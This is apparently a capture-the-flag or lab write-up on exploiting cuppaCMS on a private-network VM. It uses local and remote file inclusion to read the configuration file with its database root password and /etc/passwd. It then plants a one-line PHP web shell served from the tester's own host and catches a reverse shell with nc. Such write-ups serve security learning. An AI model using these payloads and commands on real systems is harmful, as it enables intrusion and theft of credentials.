# CMS RCE
- Tried to figure out cuppaCMS login credential, not smooth
- But here we've got an exploit
https://www.exploit-db.com/exploits/25971
![](Pasted%20image%2020210423200652.png)

- R/LFI
	http://192.168.254.155/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
![](Pasted%20image%2020210423200832.png)

```bash
┌[ChanninNicosMBP]─[20:09-23/04]─[/tmp]
└╼cn$ echo 'PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiYnJhdmVyeSI7CgkJcHVibGljICR1c2VyID0gInJvb3QiOwoJCXB1YmxpYyAkcGFzc3dvcmQgPSAicjAwdGlzYXdlczBtZSI7CgkJcHVibGljICR0YWJsZV9wcmVmaXggPSAiY3VfIjsKCQlwdWJsaWMgJGFkbWluaXN0cmF0b3JfdGVtcGxhdGUgPSAiZGVmYXVsdCI7CgkJcHVibGljICRsaXN0X2xpbWl0ID0gMjU7CgkJcHVibGljICR0b2tlbiA9ICJPQnFJUHFsRldmM1giOwoJCXB1YmxpYyAkYWxsb3dlZF9leHRlbnNpb25zID0gIiouYm1wOyAqLmNzdjsgKi5kb2M7ICouZ2lmOyAqLmljbzsgKi5qcGc7ICouanBlZzsgKi5vZGc7ICoub2RwOyAqLm9kczsgKi5vZHQ7ICoucGRmOyAqLnBuZzsgKi5wcHQ7ICouc3dmOyAqLnR4dDsgKi54Y2Y7ICoueGxzOyAqLmRvY3g7ICoueGxzeCI7CgkJcHVibGljICR1cGxvYWRfZGVmYXVsdF9wYXRoID0gIm1lZGlhL3VwbG9hZHNGaWxlcyI7CgkJcHVibGljICRtYXhpbXVtX2ZpbGVfc2l6ZSA9ICI1MjQyODgwIjsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbiA9IDA7CgkJcHVibGljICRzZWN1cmVfbG9naW5fdmFsdWUgPSAiZ29vZHRlY2giOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gImRvb3JzaGVsbC5qcGciOwoJfSAKPz4K' | base64 -d > config.php

┌[ChanninNicosMBP]─[20:09-23/04]─[/tmp]
└╼cn$ cat config.php                                                                                                                                                                                    1 ⚙
<?php
	class Configuration{
		public $host = "localhost";
		public $db = "bravery";
		public $user = "root";
		public $password = "r00tisawes0me";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "goodtech";
		public $secure_login_redirect = "doorshell.jpg";
	}
?>
```

- mysql
	DB = `bravery`
	USER = `root`
	PASS = `r00tisawes0me`
	upload_default_path = `media/uploadsFiles`
	
- Since we have LFI, we can use Burp to get more information
```bash
┌[ChanninNicosMBP]─[20:18-23/04]─[/tmp]
└╼cn$ echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApiaW46eDoxOjE6YmluOi9iaW46L3NiaW4vbm9sb2dpbgpk
...[snip]...mluL25vbG9naW4Kcmljazp4OjEwMDQ6MTAwNDo6L2hvbWUvcmljazovYmluL2Jhc2gK' | base64 -d | grep bash
root:x:0:0:root:/root:/bin/bash
david:x:1000:1000:david:/home/david:/bin/bash
rick:x:1004:1004::/home/rick:/bin/bash
```

- Now we use RFI
```bash
┌[ChanninNicosMBP]─[20:26-23/04]─[/tmp]
└╼cn$ echo '<?php system($_GET["cmd"]); ?>' > shell.php                                                                                                                             

┌[ChanninNicosMBP]─[20:26-23/04]─[/tmp]
└╼cn$ python3 -m http.server                                                             
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:192.168.20.3 - - [23/Apr/2021 20:27:04] "GET /shell.php HTTP/1.0" 200 -
```

- Url
	http://192.168.254.155/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.20.1:8000/shell.php&cmd=id
![](Pasted%20image%2020210423202944.png)

- Now we can have our reverse shell
 ```bash
┌[ChanninNicosMBP]─[20:42-23/04]─[/Users/cn]
└╼cn$ bash

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
bash-3.2$ nc -l 9001
sh: no job control in this shell
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ ^Z
[1]+  Stopped                 nc -l 9001
bash-3.2$ stty raw -echo
bash-3.2$ nc -l 9001

bash-4.2$ ls
alertConfigField.php  alertIFrame.php  alertImage.php  defaultAlert.php
bash-4.2$ export TERM=xterm
 ```
 
 
 